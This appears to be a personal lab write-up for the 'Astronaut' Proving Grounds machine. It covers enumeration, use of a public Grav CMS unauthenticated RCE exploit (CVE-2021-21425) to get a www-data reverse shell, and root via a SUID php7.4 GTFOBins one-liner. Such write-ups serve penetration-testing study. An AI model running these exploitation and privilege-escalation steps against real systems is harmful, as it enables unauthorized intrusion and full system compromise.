# Astronaut  (Proving Grounds Practice · Linux · Intermediate)

- **IP:** 192.168.190.12  (host: `gravity`)   **Date:** 2026-10-19
- **One-line:** **Grav CMS** unauthenticated RCE (CVE-2021-21425, scheduler YAML write) → `www-data` → **SUID `/usr/bin/php7.4`** → root in one GTFOBins command.

---

## 1. Enumeration

```bash
nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $IP       # 22, 80
nmap -p22,80 -sCV -Pn -oN scans/services.txt $IP
whatweb http://$IP                                            # Apache 2.4.41 (Ubuntu)
```
Port 80 served HTML. **View-source** gave it away:
```
/grav-admin/                          ← Grav's app path
/grav-admin/user/themes/quark/js/...  ← "user/themes" + "quark" theme = Grav CMS
```
`whatweb http://$IP/grav-admin/` → `MetaGenerator[GravCMS]`. **Grav CMS confirmed.**
> 🔑 Recognition: the *paths in the page source* name the product (`user/themes`, `quark` = Grav). Same method as Subrion — read the source/headers/title.

## 2. Foothold (www-data)

**Vector:** Grav Admin plugin ≤ 1.10.7 — unauthenticated RCE (**CVE-2021-21425**). Grabs the `admin-nonce` from `/grav-admin/admin` (unauth), POSTs a malicious **scheduler job** that runs PHP → reverse shell.

```bash
searchsploit grav
# pick: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) | 49876/49973.py
#   (unauthenticated ✅ + runnable .py ✅ + RCE ✅ ; the .rb is Metasploit — skip)
searchsploit -m 49973 ; searchsploit -x 49973      # READ it first
```
Two ways this PoC exists — **check how it takes input**:
- **argparse version:** `python3 49973.py -u http://192.168.190.12/grav-admin/`  ← this is what worked
- **hardcoded version:** edit `target=` + the base64 reverse-shell blob inside, then `python3 49973.py`

```bash
# Kali: nc -lvnp 443
python3 49973.py -u http://192.168.190.12/grav-admin/     # → www-data shell on nc
python3 -c 'import pty;pty.spawn("/bin/bash")'            # stabilize (Ctrl+Z → stty raw -echo; fg → export TERM=xterm) NO Ctrl+C
```
- **local.txt:** `[captured]`

## 3. Privilege Escalation (root)

**Dead-ends first (methodical elimination):**
- `sudo -l` → asks for www-data's password (it has none) → **skip** (don't guess).
- `getcap -r /` → only standard caps → nothing.
- `/etc/crontab` → all stock run-parts → no custom root job.
- `/usr/bin/pkexec` → **`-rwxr-xr-x` (NOT SUID), dated Feb 2022 = patched** → **PwnKit out.**
- Grav admin **bcrypt** hash (`user/accounts/*.yaml`, `$2y$10$...`) → crackable but **only 32 H/s on CPU** → too slow to rely on.

**The real path — SUID php:**
```bash
find / -perm -4000 -type f 2>/dev/null
#   ... /usr/bin/php7.4   ← the odd one out (a code-running binary, SUID root)
ls -l /usr/bin/php7.4
#   -rwsr-xr-x  ← the 's' = SUID, owner root
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"      # GTFOBins (php → SUID) → root
id                                                         # euid=0(root) 🎉
cat /root/proof.txt
```
**Why it works:** SUID = the binary runs as its **owner (root)**. `php` runs arbitrary code → `pcntl_exec('/bin/sh',['-p'])` spawns a root shell. The **`-p`** is essential: it stops the shell dropping euid→ruid (without it you'd fall back to www-data).
- **proof.txt:** `[captured]`

## 4. Learnings & tips
- **Recognition by source paths.** `user/themes/quark` → Grav. The product name leaks in source/headers/title — read them.
- **Read + adapt exploits.** Public PoCs have hardcoded IPs/targets AND differ in how they take input — **`--help` / read the top** to see argparse (`-u`) vs an editable `target=` variable. Feed it the way it expects.
- **SUID on a code-running binary = instant root.** php/python/perl/bash/etc. → GTFOBins → one line. The **`-p`** flag keeps euid=0.
- **`find -perm -4000` IS the SUID filter** — the list = all SUID files; `ls -l` to see the `s` bit.

## 5. Rabbit holes / mistakes (so I don't repeat them)
- ⚠️ **Guessed www-data's sudo password** (`admin`) — www-data has none; don't waste attempts on `sudo -l` prompts.
- ⚠️ **Nearly sank hours into a slow bcrypt crack (32 H/s).** The **SUID list gave root in one command** — *always run the fast checks (sudo/SUID/caps) in parallel with any slow crack; don't block on hashcat.*
- ⚠️ pkexec looked tempting but was **patched (not SUID)** — check `ls -l /usr/bin/pkexec` before assuming PwnKit.
- 💡 `su` needs a stabilized TTY; never Ctrl+C a raw shell.

## 6. KB tags used
- `[ENUM-UNUSUAL-PORTS]` / recognition · `[WEB-QUICK]` · `[EXPLOIT-RESEARCH]` (read + adapt the PoC) · `[SHELL-QUICK]` / `[SHELL-STABILIZE]` · `[LINUX-SUID]` + `[GTFOBINS-WORKFLOW]` (the root) · `[CONCEPT-LINUX-PERMS]` · `[HASH-IDENTIFICATION]` (bcrypt `-m 3200`) · `[FLAG-HUNT]`
